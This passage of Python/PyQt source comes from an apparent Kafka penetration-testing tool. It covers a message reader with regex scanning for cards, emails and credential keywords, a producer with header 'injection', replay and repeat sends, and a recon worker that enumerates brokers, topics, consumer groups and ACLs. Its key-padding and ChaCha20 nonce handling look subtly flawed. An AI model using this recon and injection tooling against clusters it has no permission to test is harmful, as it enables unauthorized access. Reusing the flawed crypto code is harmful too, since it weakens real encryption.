        self.btn_copy_detail = QPushButton("COPY"); self.btn_copy_detail.setFixedWidth(60); self.btn_copy_detail.setEnabled(False)
        nav.addWidget(self.btn_prev); nav.addWidget(self.lbl_nav, 1); nav.addWidget(self.btn_next)
        nav.addSpacing(8); nav.addWidget(self.btn_copy_detail)
        detail_vbox.addLayout(nav)

        raw_row = QHBoxLayout()
        self.chk_ignore_schema = QCheckBox("Ignore schema")
        lbl_fmt = QLabel("Display as"); lbl_fmt.setObjectName("lbl_key")
        self.cmb_display_fmt = QComboBox(); self.cmb_display_fmt.addItems(["auto-detect", "hex", "hex dump", "UTF-8 raw", "base64"])
        self.chk_show_headers = QCheckBox("Show headers"); self.chk_show_headers.setChecked(True)
        raw_row.addWidget(self.chk_ignore_schema); raw_row.addSpacing(16); raw_row.addWidget(lbl_fmt)
        raw_row.addWidget(self.cmb_display_fmt); raw_row.addSpacing(16); raw_row.addWidget(self.chk_show_headers)
        raw_row.addStretch(); detail_vbox.addLayout(raw_row)

        self.lbl_meta = QLabel(""); self.lbl_meta.setObjectName("lbl_status_inf"); self.lbl_meta.setWordWrap(True)
        detail_vbox.addWidget(self.lbl_meta)

        self.detail_view = QTextEdit(); self.detail_view.setReadOnly(True)
        self.detail_view.setFont(QFont("Courier New", 11))
        self.detail_view.setPlaceholderText("// select a message with < > to inspect it here")
        detail_vbox.addWidget(self.detail_view, 1)
        splitter.addWidget(detail); splitter.setSizes([420, 460]); root.addWidget(splitter, 1)

        self.btn_read.clicked.connect(self._on_read); self.btn_stop.clicked.connect(self._on_stop)
        self.btn_clear_log.clicked.connect(self._on_clear); self.btn_export.clicked.connect(self._on_export)
        self.btn_prev.clicked.connect(self._on_prev); self.btn_next.clicked.connect(self._on_next)
        self.btn_copy_detail.clicked.connect(self._on_copy_detail)
        self.chk_ignore_schema.toggled.connect(self._on_view_opts_changed)
        self.cmb_display_fmt.currentIndexChanged.connect(self._on_view_opts_changed)
        self.chk_show_headers.toggled.connect(self._on_view_opts_changed)

    def _on_read(self):
        broker   = self.broker_bar.inp_broker.text().strip()
        topic    = self.broker_bar.inp_topic.text().strip()
        group_id = self.broker_bar.inp_group.text().strip() or "kafkapt-consumer"
        if not broker or not topic:
            self.log.append_line("! broker and topic are required", "error"); return
        if self._worker and self._worker.isRunning(): return
        cfg      = self._cert_panel.get_tls_config() if self._cert_panel else {}
        tls_cfg  = cfg.get("broker")
        sasl_cfg = cfg.get("sasl")
        self._msg_count = 0; self.lbl_msg_count.setText("0 received")
        self.btn_read.setEnabled(False); self.btn_stop.setEnabled(True)
        self._worker = KafkaConsumerWorker(
            broker, topic, group_id, self.cmb_offset.currentText(),
            self.inp_offset_val.value(), self.inp_count.value(), tls_cfg,
            sasl_cfg=sasl_cfg,
        )
        self._worker.message_received.connect(self._on_message)
        self._worker.status_update.connect(self._on_status)
        self._worker.consumer_error.connect(self._on_error)
        self._worker.done.connect(self._on_done); self._worker.start()

    def _on_stop(self):
        if self._worker and self._worker.isRunning():
            self.log.append_line("// stop requested …", "warn"); self._worker.stop()

    def _on_message(self, topic, partition, offset, ts_type, ts_ms, decoded, raw, headers):
        self._msg_count += 1; self.lbl_msg_count.setText(f"{self._msg_count} received")
        ts_str = self._fmt_ts(ts_ms, ts_type)
        self._messages.append({
            "topic": topic, "partition": partition, "offset": offset,
            "ts_ms": ts_ms, "ts_type": ts_type, "ts_str": ts_str,
            "decoded": decoded, "raw": raw, "headers": list(headers or []),
        })
        self.log.append_line(
            f"── msg #{self._msg_count}  topic={topic}  partition={partition}  "
            f"offset={offset}  {ts_str}", "ok"
        )
        if headers:
            self.log.append_line(f"   headers: {[n for n, _ in headers]}", "info")
        for line in decoded.splitlines()[:2]: self.log.append_line(line, "data")
        if len(decoded.splitlines()) > 2: self.log.append_line("  …", "muted")
        self.log.append_line("", "muted")
        self._show_message(len(self._messages) - 1)
        self._scan_pii(decoded, topic, partition, offset)

    def _on_status(self, msg): self.log.append_line(f"// {msg}", "muted")
    def _on_error(self, msg):  self.log.append_line(f"! {msg}", "error")

    def _on_done(self, total):
        self.btn_read.setEnabled(True); self.btn_stop.setEnabled(False)
        self.log.append_line(f"// consumer closed — {total} message(s) received", "warn")

    def _scan_pii(self, decoded: str, topic: str, partition: int, offset: int):
        hits = []
        if re.search(r'\b[0-9]{4}[- ]?[0-9]{4}[- ]?[0-9]{4}[- ]?[0-9]{4}\b', decoded):
            hits.append("potential credit card number")
        if re.search(r'[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}', decoded):
            hits.append("email address")
        if re.search(r'(?i)(password|passwd|secret|apikey|api_key|token|private_key)\s*[=:"\'`]', decoded):
            hits.append("credential keyword")
        if hits:
            FindingStore.get().add(Finding(
                severity="HIGH",
                title=f"Potential sensitive data in topic '{topic}'",
                description=(
                    f"Message at partition={partition} offset={offset} contains: {', '.join(hits)}. "
                    "Verify whether PII or credentials are transmitted in plaintext."
                ),
                evidence=decoded[:500], phase="data",
            ))

    def _show_message(self, idx: int):
        if not self._messages or idx < 0 or idx >= len(self._messages): return
        self._current_idx = idx; env = self._messages[idx]; n = len(self._messages)
        self.lbl_nav.setText(f"msg  {idx + 1}  /  {n}")
        self.btn_prev.setEnabled(idx > 0); self.btn_next.setEnabled(idx < n - 1)
        self.btn_copy_detail.setEnabled(True)
        self.lbl_meta.setText(
            f"topic={env['topic']}  partition={env['partition']}  "
            f"offset={env['offset']}  {env['ts_str']}"
        )
        content = self._deserialize(env["raw"],
                                    ignore_schema=self.chk_ignore_schema.isChecked(),
                                    display_fmt=self.cmb_display_fmt.currentText())
        if self.chk_show_headers.isChecked() and env.get("headers"):
            content += "\n\n─── KAFKA HEADERS ───\n"
            for name, value in env["headers"]:
                try: val_str = value.decode("utf-8", errors="replace")
                except Exception: val_str = value.hex() if isinstance(value, bytes) else str(value)
                content += f"  {name}: {val_str}\n"
        self.detail_view.setPlainText(content)

    def _on_prev(self): self._show_message(self._current_idx - 1)
    def _on_next(self): self._show_message(self._current_idx + 1)
    def _on_copy_detail(self): QApplication.clipboard().setText(self.detail_view.toPlainText())
    def _on_view_opts_changed(self):
        if self._current_idx >= 0: self._show_message(self._current_idx)

    def _on_clear(self):
        self.log.clear_log(); self._messages.clear()
        self._current_idx = -1; self._msg_count = 0
        self.lbl_msg_count.setText("0 received"); self.lbl_nav.setText("no messages")
        self.lbl_meta.setText(""); self.detail_view.clear()
        self.btn_prev.setEnabled(False); self.btn_next.setEnabled(False); self.btn_copy_detail.setEnabled(False)

    def _on_export(self):
        if not self._messages:
            QMessageBox.information(self, "Export", "No messages to export."); return
        path, _ = QFileDialog.getSaveFileName(self, "Export messages", "kafkapt-messages.ndjson",
                                               "NDJSON (*.ndjson);;JSON Lines (*.jsonl);;All Files (*)")
        if not path: return
        try:
            with open(path, "w", encoding="utf-8") as fh:
                for env in self._messages:
                    rec = {
                        "topic": env["topic"], "partition": env["partition"],
                        "offset": env["offset"], "timestamp": env["ts_str"],
                        "headers": [
                            {"name": n, "value": v.decode("utf-8", errors="replace") if isinstance(v, bytes) else str(v)}
                            for n, v in env.get("headers", [])
                        ],
                        "value_decoded": env["decoded"], "value_hex": env["raw"].hex() if env["raw"] else "",
                    }
                    fh.write(json.dumps(rec, ensure_ascii=False) + "\n")
            self.log.append_line(f"// exported {len(self._messages)} message(s) → {path}", "ok")
        except Exception as exc:
            self.log.append_line(f"! export failed: {exc}", "error")

    def _deserialize(self, raw: bytes, ignore_schema: bool = False, display_fmt: str = "auto-detect") -> str:
        if not raw: return "<empty payload>"
        if ignore_schema: return self._render_raw(raw, display_fmt)
        if len(raw) > 5 and raw[0] == 0x00:
            schema_id = int.from_bytes(raw[1:5], "big"); payload = raw[5:]
            schema = self._schema_panel.get_loaded_schema() if self._schema_panel else None
            if schema is not None:
                try:
                    import fastavro
                    parsed_schema = fastavro.parse_schema(dict(schema))
                    record = fastavro.schemaless_reader(io.BytesIO(payload), parsed_schema)
                    return (f"// confluent-avro  schema_id={schema_id}  ({len(payload)} bytes)\n"
                            + "─" * 48 + "\n" + json.dumps(record, indent=2, default=str))
                except ImportError:
                    return (f"// confluent-avro  schema_id={schema_id}\n// fastavro not installed\n// hex:\n{payload.hex()}")
                except Exception as exc:
                    return (f"// confluent-avro  schema_id={schema_id}\n// error: {exc}\n// hex:\n{payload.hex()}")
            else:
                return (f"// confluent-avro  schema_id={schema_id}  ({len(payload)} bytes)\n"
                        f"// load schema ID {schema_id} in SCHEMA tab to deserialize\n// hex:\n{payload.hex()}")
        return self._render_raw(raw, display_fmt)

    def _render_raw(self, raw: bytes, display_fmt: str) -> str:
        if display_fmt == "hex":       return raw.hex()
        if display_fmt == "hex dump":  return self._hex_dump(raw)
        if display_fmt == "base64":    return base64.b64encode(raw).decode("ascii")
        if display_fmt == "UTF-8 raw":
            try: return raw.decode("utf-8")
            except UnicodeDecodeError as exc:
                return f"// UTF-8 decode failed: {exc}\n{self._hex_dump(raw)}"
        try: return json.dumps(json.loads(raw.decode("utf-8")), indent=2, ensure_ascii=False)
        except Exception: pass
        try: return raw.decode("utf-8")
        except Exception: pass
        return f"// binary payload  {len(raw)} bytes\n{self._hex_dump(raw)}"

    @staticmethod
    def _hex_dump(data: bytes, width: int = 16) -> str:
        lines = []
        for offset in range(0, len(data), width):
            chunk = data[offset: offset + width]
            hex_part = " ".join(f"{b:02x}" for b in chunk)
            mid = width // 2 * 3 - 1
            if len(hex_part) > mid: hex_part = hex_part[:mid] + "  " + hex_part[mid:]
            ascii_part = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
            col_w = width * 3 + 1
            lines.append(f"{offset:04x}  {hex_part:<{col_w}}  {ascii_part}")
        return "\n".join(lines)

    @staticmethod
    def _fmt_ts(ts_ms: int, ts_type: int = 0) -> str:
        _TYPE_LABEL = {1: "create", 2: "append"}
        if ts_type == 0 or ts_ms <= 0: return "no timestamp"
        try:
            dt = datetime.datetime.fromtimestamp(ts_ms / 1000, tz=datetime.timezone.utc)
            label = _TYPE_LABEL.get(ts_type, "")
            return dt.strftime("%Y-%m-%d %H:%M:%S UTC") + (f"  [{label}]" if label else "")
        except (OSError, OverflowError, ValueError):
            return f"ts={ts_ms} ms (parse error)"

# ─────────────────────────────────────────────────────────
#  Background worker — Kafka producer  (+ headers param)
# ─────────────────────────────────────────────────────────

class KafkaProducerWorker(QThread):
    delivery_report = pyqtSignal(int, str, int, int, str)
    producer_error  = pyqtSignal(str)
    done            = pyqtSignal(int, int)

    def __init__(self, broker: str, topic: str,
                 messages: list,
                 tls_cfg:  dict | None,
                 headers:  list | None = None,
                 sasl_cfg: dict | None = None):
        super().__init__()
        self.broker   = broker
        self.topic    = topic
        self.messages = messages
        self.tls_cfg  = tls_cfg
        self.headers  = headers or []
        self.sasl_cfg = sasl_cfg

    def _build_conf(self) -> dict:
        return _build_kafka_conf(self.broker, self.tls_cfg, self.sasl_cfg, extra={
            "acks": "all", "retries": 0, "delivery.timeout.ms": 15000,
        })

    def run(self):
        try:
            from confluent_kafka import Producer, KafkaException
        except ImportError:
            self.producer_error.emit("confluent-kafka not installed — run: pip install confluent-kafka"); return
        try:
            producer = Producer(self._build_conf())
        except KafkaException as exc:
            self.producer_error.emit(f"producer init failed: {exc}"); return

        sent = 0; failed = 0
        results: dict[int, tuple] = {}

        def _cb(err, msg, idx):
            nonlocal sent, failed
            if err:
                failed += 1; results[idx] = (msg.partition() if msg else -1, -1, str(err))
            else:
                sent += 1; results[idx] = (msg.partition(), msg.offset(), "")

        # confluent_kafka headers format: [(str, bytes), ...]
        kafka_headers = None
        if self.headers:
            kafka_headers = [
                (name, val.encode("utf-8") if isinstance(val, str) else val)
                for name, val in self.headers
            ]

        try:
            for idx, (key, value) in enumerate(self.messages):
                kwargs = {
                    "topic":       self.topic,
                    "key":         key,
                    "value":       value,
                    "on_delivery": lambda err, msg, i=idx: _cb(err, msg, i),
                }
                if kafka_headers:
                    kwargs["headers"] = kafka_headers
                producer.produce(**kwargs)
                producer.poll(0)

            remaining = producer.flush(timeout=15)
            if remaining > 0:
                self.producer_error.emit(f"{remaining} message(s) not acknowledged after 15 s flush")
        except KafkaException as exc:
            self.producer_error.emit(f"kafka exception: {exc}")
        except Exception as exc:
            self.producer_error.emit(f"unexpected error: {exc}")

        for idx in sorted(results):
            partition, offset, error = results[idx]
            self.delivery_report.emit(idx, self.topic, partition, offset, error)
        self.done.emit(sent, failed)


# ─────────────────────────────────────────────────────────
#  WriterPanel v2  (+ HeadersWidget)
# ─────────────────────────────────────────────────────────

class WriterPanel(QGroupBox):
    def __init__(self):
        super().__init__("[ SEND TO TOPIC ]")
        self._cert_panel   = None
        self._enc_panel    = None
        self._schema_panel = None
        self._rand_panel   = None
        self._proxy_panel  = None
        self._worker       = None
        self._sent_total   = 0
        self._build()

    def set_cert_panel(self, p):   self._cert_panel   = p
    def set_enc_panel(self, p):    self._enc_panel    = p
    def set_schema_panel(self, p): self._schema_panel = p
    def set_rand_panel(self, p):   self._rand_panel   = p
    def set_proxy_panel(self, p):
        self._proxy_panel = p
        self.headers_widget.set_proxy_panel(p)

    def _build(self):
        vbox = QVBoxLayout(self); vbox.setSpacing(8)
        self.broker_bar = KafkaBrokerBar(); vbox.addWidget(self.broker_bar)

        key_row = QHBoxLayout()
        lbl_key = QLabel("Message Key"); lbl_key.setObjectName("lbl_key")
        self.inp_msg_key = QLineEdit(); self.inp_msg_key.setPlaceholderText("optional partition key")
        key_row.addWidget(lbl_key); key_row.addWidget(self.inp_msg_key); vbox.addLayout(key_row)

        src_row = QHBoxLayout()
        lbl_src = QLabel("Payload Source"); lbl_src.setObjectName("lbl_key")
        self.cmb_src = QComboBox()
        self.cmb_src.addItems(["Manual JSON", "From Randomizer", "From Reader (replay)"])
        self.cmb_src.currentTextChanged.connect(self._on_src_change)
        src_row.addWidget(lbl_src); src_row.addWidget(self.cmb_src); src_row.addStretch()
        vbox.addLayout(src_row)

        raw_row = QHBoxLayout()
        self.chk_raw = QCheckBox("Ignore schema — send raw payload")
        lbl_raw_enc  = QLabel("Encoding"); lbl_raw_enc.setObjectName("lbl_key")
        self.cmb_raw_enc = QComboBox(); self.cmb_raw_enc.addItems(["UTF-8", "hex", "base64"])
        self.cmb_raw_enc.setEnabled(False)
        self.lbl_raw_hint = QLabel("schema and encryption steps will be skipped")
        self.lbl_raw_hint.setObjectName("lbl_status_inf"); self.lbl_raw_hint.setVisible(False)
        self.chk_raw.toggled.connect(self._on_raw_toggle)
        raw_row.addWidget(self.chk_raw); raw_row.addSpacing(20)
        raw_row.addWidget(lbl_raw_enc); raw_row.addWidget(self.cmb_raw_enc)
        raw_row.addSpacing(12); raw_row.addWidget(self.lbl_raw_hint); raw_row.addStretch()
        vbox.addLayout(raw_row)

        self.payload_edit = QTextEdit()
        self.payload_edit.setPlaceholderText('{\n  "field": "value"\n}')
        self.payload_edit.setFont(QFont("Courier New", 11))
        self.payload_edit.setMinimumHeight(100)
        vbox.addWidget(self.payload_edit)

        # ── Headers widget  ← NEW ─────────────────────────────
        hdr_group = QGroupBox("[ KAFKA HEADERS — INJECTION TARGET ]")
        hdr_layout = QVBoxLayout(hdr_group); hdr_layout.setContentsMargins(8, 14, 8, 8)
        self.headers_widget = HeadersWidget()
        hdr_layout.addWidget(self.headers_widget)
        vbox.addWidget(hdr_group)

        btns = QHBoxLayout()
        self.btn_send = QPushButton("SEND MESSAGE"); self.btn_send.setObjectName("btn_accent")
        self.chk_repeat  = QCheckBox("Repeat")
        self.inp_repeat_n = QSpinBox(); self.inp_repeat_n.setRange(1, 10000)
        self.inp_repeat_n.setValue(1); self.inp_repeat_n.setFixedWidth(80); self.inp_repeat_n.setEnabled(False)
        self.chk_repeat.toggled.connect(self.inp_repeat_n.setEnabled)
        self.lbl_sent = QLabel("0 sent"); self.lbl_sent.setObjectName("lbl_status_inf")
        btns.addWidget(self.btn_send); btns.addWidget(self.chk_repeat); btns.addWidget(self.inp_repeat_n)
        btns.addSpacing(12); btns.addWidget(self.lbl_sent); btns.addStretch()
        vbox.addLayout(btns)

        self.send_log = LogPane("// delivery reports will appear here")
        self.send_log.setMaximumHeight(120)
        vbox.addWidget(self.send_log)

        self.btn_send.clicked.connect(self._on_send)

    def _on_raw_toggle(self, checked: bool):
        self.cmb_raw_enc.setEnabled(checked); self.lbl_raw_hint.setVisible(checked)
        if checked:
            self.cmb_src.setEnabled(False); self.payload_edit.setEnabled(True)
            self.payload_edit.setPlaceholderText(
                "// raw payload — paste UTF-8 text, hex bytes, or base64\n"
                "// example hex: 00 00 00 00 01 0c 54 45 53 54"
            )
        else:
            self.cmb_src.setEnabled(True); self._on_src_change(self.cmb_src.currentText())

    def _on_src_change(self, src: str):
        if self.chk_raw.isChecked(): return
        manual = src == "Manual JSON"; self.payload_edit.setEnabled(manual)
        if src == "From Randomizer":
            self.payload_edit.setPlaceholderText("// payload will be generated fresh from schema")
        elif src == "From Reader (replay)":
            self.payload_edit.setPlaceholderText("// paste a message from the READ tab here")
            self.payload_edit.setEnabled(True)
        else:
            self.payload_edit.setPlaceholderText('{\n  "field": "value"\n}')

    def _on_send(self):
        broker   = self.broker_bar.inp_broker.text().strip()
        topic    = self.broker_bar.inp_topic.text().strip()
        msg_key  = self.inp_msg_key.text().strip() or None
        if not broker or not topic:
            self.send_log.append_line("! broker and topic are required", "error"); return
        if self._worker and self._worker.isRunning():
            self.send_log.append_line("! a send is already in progress", "warn"); return

        repeat    = self.inp_repeat_n.value() if self.chk_repeat.isChecked() else 1
        key_bytes = msg_key.encode("utf-8") if msg_key else None
        headers   = self.headers_widget.get_headers()

        # Extract auth config once — used by both raw and Avro paths below
        _cfg     = self._cert_panel.get_tls_config() if self._cert_panel else {}
        tls_cfg  = _cfg.get("broker")
        sasl_cfg = _cfg.get("sasl")

        if headers:
            self.send_log.append_line(
                f"// injecting {len(headers)} header(s): {[n for n, _ in headers]}", "warn"
            )

        if self.chk_raw.isChecked():
            raw_text = self.payload_edit.toPlainText().strip()
            if not raw_text:
                self.send_log.append_line("! payload is empty", "error"); return
            encoding = self.cmb_raw_enc.currentText()
            try:
                value_bytes = self._encode_raw(raw_text, encoding)
            except Exception as exc:
                self.send_log.append_line(f"! raw encode error ({encoding}): {exc}", "error"); return
            messages = [(key_bytes, value_bytes)] * repeat
            self.send_log.append_line(f"raw send  {len(value_bytes)} bytes × {repeat}  encoding={encoding}", "muted")
            self._fire_worker(broker, topic, messages, tls_cfg, headers, sasl_cfg); return

        src = self.cmb_src.currentText(); payload_dicts = []
        if src == "From Randomizer":
            if self._rand_panel is None:
                self.send_log.append_line("! randomizer panel not connected", "error"); return
            schema = self._schema_panel.get_loaded_schema() if self._schema_panel else None
            if schema is None:
                self.send_log.append_line("! no schema loaded", "error"); return
            try:
                for _ in range(repeat):
                    payload_dicts.append(self._rand_panel._engine.generate(schema))
            except Exception as exc:
                self.send_log.append_line(f"! randomizer error: {exc}", "error"); return
        else:
            raw_text = self.payload_edit.toPlainText().strip()
            if not raw_text:
                self.send_log.append_line("! payload is empty", "error"); return
            try:
                parsed = json.loads(raw_text)
            except json.JSONDecodeError as exc:
                self.send_log.append_line(f"! invalid JSON: {exc}", "error"); return
            payload_dicts = [parsed] * repeat

        messages = []
        schema_active = self._schema_panel is not None and self._schema_panel.get_loaded_schema() is not None
        enc_mode = self._enc_panel.get_config()["mode"] if self._enc_panel else "None (Avro only)"
        self.send_log.append_line(
            f"serializing {len(payload_dicts)} message(s)  "
            f"avro={'yes' if schema_active else 'no (plain JSON)'}  "
            f"mTLS={'yes' if tls_cfg else 'no'}  "
            f"SASL={'yes (' + sasl_cfg['mechanism'] + ')' if sasl_cfg else 'no'}  "
            f"encryption={enc_mode}", "muted"
        )
        for i, d in enumerate(payload_dicts):
            try:
                value_bytes = self._serialize_and_encrypt(d)
            except Exception as exc:
                self.send_log.append_line(f"! msg #{i + 1} serialize error: {exc}", "error"); return
            messages.append((key_bytes, value_bytes))

        self._fire_worker(broker, topic, messages, tls_cfg, headers, sasl_cfg)

    def _fire_worker(self, broker, topic, messages, tls_cfg, headers, sasl_cfg=None):
        self.btn_send.setEnabled(False)
        self._worker = KafkaProducerWorker(
            broker, topic, messages, tls_cfg, headers, sasl_cfg=sasl_cfg
        )
        self._worker.delivery_report.connect(self._on_delivery)
        self._worker.producer_error.connect(self._on_produce_error)
        self._worker.done.connect(self._on_produce_done)
        self._worker.start()

    def _on_delivery(self, idx, topic, partition, offset, error):
        if error:
            self.send_log.append_line(f"! msg #{idx + 1} delivery failed: {error}", "error")
        else:
            self.send_log.append_line(
                f"ok  msg #{idx + 1}  topic={topic}  partition={partition}  offset={offset}", "ok"
            )

    def _on_produce_error(self, msg): self.send_log.append_line(f"! {msg}", "error")

    def _on_produce_done(self, sent, failed):
        self.btn_send.setEnabled(True)
        self._sent_total += sent; self.lbl_sent.setText(f"{self._sent_total} sent")
        self.send_log.append_line(f"// done  sent={sent}  failed={failed}",
                                   "ok" if failed == 0 else "warn")

    def _encode_raw(self, text: str, encoding: str) -> bytes:
        if encoding == "hex":
            clean = "".join(text.split())
            try: return bytes.fromhex(clean)
            except ValueError as exc: raise ValueError(f"invalid hex input: {exc}") from exc
        if encoding == "base64":
            try: return base64.b64decode(text)
            except Exception as exc: raise ValueError(f"invalid base64 input: {exc}") from exc
        return text.encode("utf-8")

    def _serialize_and_encrypt(self, payload_dict: dict) -> bytes:
        schema = self._schema_panel.get_loaded_schema() if self._schema_panel else None
        if schema is not None:
            try:
                import fastavro
            except ImportError:
                raise RuntimeError("fastavro not installed — run: pip install fastavro")
            try:
                parsed_schema = fastavro.parse_schema(dict(schema))
                buf = io.BytesIO(); fastavro.schemaless_writer(buf, parsed_schema, payload_dict)
                avro_bytes = buf.getvalue()
            except Exception as exc:
                raise RuntimeError(f"Avro serialization failed: {exc}")
            schema_id = self._schema_panel.inp_schema_id.value()
            raw: bytes = b"\x00" + schema_id.to_bytes(4, "big") + avro_bytes
        else:
            raw = json.dumps(payload_dict, ensure_ascii=False).encode("utf-8")
        if self._enc_panel is None: return raw
        enc_cfg = self._enc_panel.get_config()
        if enc_cfg["mode"] == "None (Avro only)": return raw
        return self._encrypt(raw, enc_cfg)

    def _decode_key(self, secret: str, encoding: str, required_len: int) -> bytes:
        if not secret: raise RuntimeError("encryption enabled but shared secret is empty")
        if encoding == "hex":
            try: key = bytes.fromhex(secret)
            except ValueError: raise RuntimeError("shared secret is not valid hex")
        elif encoding == "base64":
            try: key = base64.b64decode(secret)
            except Exception: raise RuntimeError("shared secret is not valid base64")
        else:
            key = secret.encode("utf-8")
        if len(key) < required_len: key = key + b"\x00" * (required_len - len(key))
        elif len(key) > required_len: key = key[:required_len]
        return key

    def _resolve_iv(self, enc_cfg: dict, iv_len: int) -> tuple[bytes, bool]:
        iv_mode = enc_cfg.get("iv_mode", "Random per message")
        if iv_mode == "Fixed (provide below)":
            fixed = enc_cfg.get("fixed_iv", "").strip()
            if not fixed: raise RuntimeError("Fixed IV mode selected but no IV value provided")
            try: iv = bytes.fromhex(fixed)
            except ValueError: raise RuntimeError("fixed IV is not valid hex")
            if len(iv) != iv_len: raise RuntimeError(f"IV must be exactly {iv_len} bytes")
            return iv, False
        if iv_mode == "Prepended to ciphertext": return os.urandom(iv_len), True
        return os.urandom(iv_len), False

    def _encrypt(self, plaintext: bytes, enc_cfg: dict) -> bytes:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.primitives import padding as crypto_padding
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
        except ImportError:
            raise RuntimeError("cryptography not installed — run: pip install cryptography")
        mode_str = enc_cfg["mode"]; encoding = enc_cfg.get("encoding", "hex"); secret = enc_cfg.get("secret", "")
        if "CBC" in mode_str:
            key_len     = 16 if "128" in mode_str else 32
            key         = self._decode_key(secret, encoding, key_len)
            iv, prepend = self._resolve_iv(enc_cfg, 16)
            padder = crypto_padding.PKCS7(128).padder()
            padded = padder.update(plaintext) + padder.finalize()
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
            enc    = cipher.encryptor()
            ct     = enc.update(padded) + enc.finalize()
            return (iv + ct) if prepend else ct
        if "GCM" in mode_str:
            key_len        = 16 if "128" in mode_str else 32
            key            = self._decode_key(secret, encoding, key_len)
            nonce, prepend = self._resolve_iv(enc_cfg, 12)
            ct = AESGCM(key).encrypt(nonce, plaintext, None)
            return (nonce + ct) if prepend else ct
        if "ChaCha20" in mode_str:
            key            = self._decode_key(secret, encoding, 32)
            nonce, prepend = self._resolve_iv(enc_cfg, 16)
            ct = ChaCha20Poly1305(key).encrypt(nonce, plaintext, None)
            return (nonce + ct) if prepend else ct
        return plaintext

# ─────────────────────────────────────────────────────────
#  Background worker — Kafka recon  [NEW]
# ─────────────────────────────────────────────────────────

class KafkaReconWorker(QThread):
    brokers_found = pyqtSignal(list)
    topics_found  = pyqtSignal(list)
    groups_found  = pyqtSignal(list)
    acls_found    = pyqtSignal(str)
    status        = pyqtSignal(str)
    error         = pyqtSignal(str)
    done          = pyqtSignal()

    def __init__(self, broker: str, tls_cfg: dict | None, phases: list[str],
                 sasl_cfg: dict | None = None):
        super().__init__()
        self.broker     = broker
        self.tls_cfg    = tls_cfg
        self.sasl_cfg   = sasl_cfg
        self.phases     = phases
        self._stop_flag = threading.Event()   # clean shutdown instead of terminate()

    def stop(self): self._stop_flag.set()

    def _conf(self) -> dict:
        return _build_kafka_conf(self.broker, self.tls_cfg, self.sasl_cfg)

    def run(self):
        try:
            from confluent_kafka import Consumer, KafkaException
            from confluent_kafka.admin import AdminClient
        except ImportError:
            self.error.emit("confluent-kafka not installed — run: pip install confluent-kafka")
            self.done.emit(); return

        conf = self._conf()

        # ── Phase 1: Topology ────────────────────────────────
        if "topology" in self.phases and not self._stop_flag.is_set():
            self.status.emit("fetching broker/topic metadata …")
            try:
                c = Consumer({**conf, "group.id": "kafkapt-recon-probe"})
                meta = c.list_topics(timeout=10); c.close()
                brokers = [f"{b.id}:{b.host}:{b.port}" for b in meta.brokers.values()]
                self.brokers_found.emit(brokers)
                topics = [
                    (t, len(tm.partitions))
                    for t, tm in meta.topics.items()
                    if not t.startswith("__")
                ]
                self.topics_found.emit(topics)
                self.status.emit(f"topology: {len(brokers)} broker(s), {len(topics)} topic(s)")
            except KafkaException as exc:
                self.error.emit(f"topology fetch failed: {exc}")

        # ── Phase 2: Consumer Groups ──────────────────────────
        if "groups" in self.phases and not self._stop_flag.is_set():
            self.status.emit("listing consumer groups …")
            try:
                admin = AdminClient(conf)
                try:
                    result = admin.list_consumer_groups()
                    groups = [g.group_id for g in result.valid]
                except AttributeError:
                    groups_meta, _ = admin.list_groups(timeout=10)
                    groups = [g.id for g in groups_meta]
                self.groups_found.emit(groups)
                self.status.emit(f"groups: {len(groups)} consumer group(s) found")
                if groups:
                    FindingStore.get().add(Finding(
                        severity="INFO",
                        title=f"Consumer groups discovered: {len(groups)} group(s)",
                        description=(
                            "Consumer groups visible from the current certificate/credentials: "
                            + ", ".join(groups[:20])
                            + (" …" if len(groups) > 20 else "")
                        ),
                        evidence="\n".join(groups), phase="recon",
                    ))
            except Exception as exc:
                self.error.emit(f"consumer group list failed: {exc}")

        # ── Phase 3: ACLs ─────────────────────────────────────
        if "acls" in self.phases and not self._stop_flag.is_set():
            self.status.emit("describing ACLs …")
            try:
                from confluent_kafka.admin import (
                    AclBindingFilter, AclOperation, AclPermissionType,
                    ResourceType, ResourcePatternType
                )
                admin      = AdminClient(conf)
                acl_filter = AclBindingFilter(
                    ResourceType.ANY, None, ResourcePatternType.ANY,
                    None, AclOperation.ANY, AclPermissionType.ANY
                )
                acls  = admin.describe_acls(acl_filter).result()
                lines = [str(a) for a in acls]
                acl_text = "\n".join(lines) if lines else "(no ACLs returned — may require admin)"
                self.acls_found.emit(acl_text)
                wildcards = [l for l in lines if "User:*" in l and "Allow" in l]
                if wildcards:
                    FindingStore.get().add(Finding(
                        severity="CRITICAL",
                        title="Wildcard ACL detected — User:* has Allow permissions",
                        description=(
                            "One or more ACL rules grant permissions to ALL users (User:*). "
                            "Any authenticated client can perform the allowed operations "
                            "regardless of their certificate identity."
                        ),
                        evidence="\n".join(wildcards), phase="authz",
                    ))
            except ImportError:
                self.acls_found.emit("(AclBindingFilter not available — upgrade confluent-kafka >= 1.8)")
            except Exception as exc:
                err_str = str(exc)
                self.acls_found.emit(f"ACL describe failed: {err_str}")
                if "AUTHORIZATION" in err_str.upper() or "not authorized" in err_str.lower():
                    self.status.emit("ACL enumeration denied (not authorized — expected for non-admin)")
                else:
                    self.error.emit(f"ACL describe error: {err_str}")

        self.done.emit()


# ─────────────────────────────────────────────────────────
#  ReconPanel  [NEW]
# ─────────────────────────────────────────────────────────

class ReconPanel(QGroupBox):
    def __init__(self):
        super().__init__("[ RECONNAISSANCE ]")
        self._cert_panel = None
        self._worker     = None
        self._build()

    def set_cert_panel(self, p): self._cert_panel = p

    def _build(self):
        root = QVBoxLayout(self); root.setSpacing(8)

        conn_row = QHBoxLayout()
        lbl_b = QLabel("Broker"); lbl_b.setObjectName("lbl_key")
        self.inp_broker = QLineEdit(); self.inp_broker.setPlaceholderText("broker:9093")
        conn_row.addWidget(lbl_b); conn_row.addWidget(self.inp_broker, 1); root.addLayout(conn_row)

        btn_row = QHBoxLayout()
        self.btn_all      = QPushButton("RUN ALL"); self.btn_all.setObjectName("btn_accent")
        self.btn_topology = QPushButton("FETCH TOPOLOGY")
        self.btn_groups   = QPushButton("LIST GROUPS")
        self.btn_acls     = QPushButton("DESCRIBE ACLs"); self.btn_acls.setObjectName("btn_warn")
